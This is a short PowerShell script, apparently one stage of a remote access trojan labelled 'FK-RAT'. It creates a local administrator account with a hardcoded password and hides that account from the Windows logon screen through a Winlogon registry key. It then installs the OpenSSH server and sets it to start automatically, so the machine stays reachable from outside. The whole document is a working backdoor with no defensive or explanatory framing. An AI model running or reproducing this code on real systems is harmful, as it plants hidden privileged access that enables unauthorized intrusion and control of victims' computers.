## Create random text (8 letters)
function randomText {
  return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

## Create Local Admin FUNCTION
function createAdmin {
  param (
    [string] $uName,
    [securestring] $pWord
  )
  begin{
    
  }
  process {
    New-LocalUser "$uName" -Password $pWord -FullName "$uName" -Description "Temporary local admin"
    Write-Verbose "$uName local user crated"
    Add-LocalGroupMember -Group "$group" -Member "$uName"
    Write-Verbose "$uName added to the local administrator group"
  }
  end{
  }
}

function getAdminGroup {
  Get-LocalGroup -sid S-1-5-32-544 | Select-Object Name -OutVariable $group

}

## Temp Directory
## variables
$temp = "$env:temp"
$dirName = randomText

$uName = "FK-RAT"
$pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)

$rPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

## goto Temp and start 
Set-Location $temp	
New-Item -Path $temp -Name $dirName -Type Directory
Set-Location $dirName

## Create Admin
createAdmin -uName $uName -pWord $pWord

## Hide Admin with registry
New-Item -Path $rPath -Force
New-ItemProperty -Path $rPath -Name $uName -Value 00000000

## Enable persistent SSH
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*